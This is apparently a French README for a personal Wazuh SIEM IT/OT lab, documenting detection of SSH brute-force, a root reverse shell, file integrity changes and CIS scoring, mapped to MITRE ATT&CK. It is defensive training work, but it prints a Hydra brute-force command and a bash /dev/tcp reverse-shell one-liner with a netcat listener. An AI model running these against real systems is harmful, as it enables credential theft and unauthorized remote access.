#  Wazuh SIEM – IT/OT Security Lab  
Projet complet de supervision, détection d’attaques et analyse SOC  
**Auteur : Dexter Mekemlong Roland**

---

##  1. Objectif du projet

Construire un environnement IT/OT complet permettant :

- la supervision centralisée via **Wazuh SIEM**
- la détection d’attaques réelles (brute-force, reverse shell, FIM)
- l’analyse MITRE ATT&CK
- la gestion des vulnérabilités
- l’évaluation de conformité (CIS Benchmark)
- l’apprentissage des workflows SOC niveau 1/2

Ce projet démontre des compétences **réelles, pratiques et opérationnelles** en cybersécurité.

---

##  2. Architecture du Lab IT/OT

*(Le schéma sera ajouté dans le dossier `architecture/`)*

---

##  3. Technologies utilisées

- **Wazuh Manager / Indexer / Dashboard**
- **pfSense** (segmentation IT/OT)
- **Debian 13**, **Kali Linux**, **Windows Server 2022**
- **Netcat**, **Hydra**, **OpenSSH**
- **MITRE ATT&CK**
- **CIS Benchmark**
- **File Integrity Monitoring (FIM)**

---

##  4. Cas d’usage SOC

---

###  4.1. Brute-force SSH → Compromission réussie

**Objectif :** simuler une attaque brute-force réelle.

#### Commande Hydra :

```
hydra -l dexter -P /usr/share/wordlists/rockyou.txt -t 1 -W 3 ssh://192.168.100.11
```

**Résultat :**

- Mot de passe trouvé : `dexter`
- Compromission du compte utilisateur

**Alertes Wazuh :**

- Rule 5710 – SSH authentication failed  
- Rule 5712 – Multiple SSH authentication failures  
- Rule 5720 – Possible brute-force attack  
- Rule 5503 – Successful SSH login  

**MITRE :**  
- T1110 (Brute Force)  
- T1078 (Valid Accounts)

---

###  4.2. Reverse Shell Root

**Objectif :** simuler une compromission complète.

#### Sur Kali :

```
nc -lvnp 4444
```

#### Sur Debian compromis :

```
bash -i >& /dev/tcp/192.168.100.12/4444 0>&1
```

**Résultat :**

- Shell root obtenu

**Alertes Wazuh :**

- Activité shell suspecte  
- Exécution de commandes  

**MITRE :**  
- T1059 (Command Execution)

---

###  4.3. File Integrity Monitoring (FIM)

**Exemple :**

```
/etc/resolv.conf — modified — Rule 550 — Level 7
```

Wazuh détecte immédiatement la modification → preuve de surveillance en temps réel.

---

###  4.4. Vulnérabilités & CIS Benchmark

Wazuh détecte :

- **48 critiques**
- **413 hautes**
- **402 moyennes**
- **Score CIS : 32%**

Analyse complète de l’exposition du système + recommandations de durcissement.

---

##  5. Résultats & Analyse SOC

Ce lab permet :

- d’identifier les attaques  
- de corréler les événements  
- d’analyser les logs  
- de comprendre les tactiques MITRE  
- de proposer des mesures correctives  

Ce projet démontre une capacité à travailler comme :

- **Analyste SOC**
- **Technicien cybersécurité**
- **IT/OT Security Engineer**

---

##  6. Compétences démontrées

- SIEM (Wazuh)  
- Analyse d’incidents  
- MITRE ATT&CK  
- Segmentation réseau  
- Linux / Windows Security  
- FIM  
- Reverse shell  
- Brute-force detection  
- CIS Benchmark  
- Troubleshooting avancé  

---

## 🚀 7. Améliorations futures

- Intégration Zabbix  
- Ajout d’un honeypot  
- Détection réseau (Suricata)  
- Automatisation via Ansible  
```

---
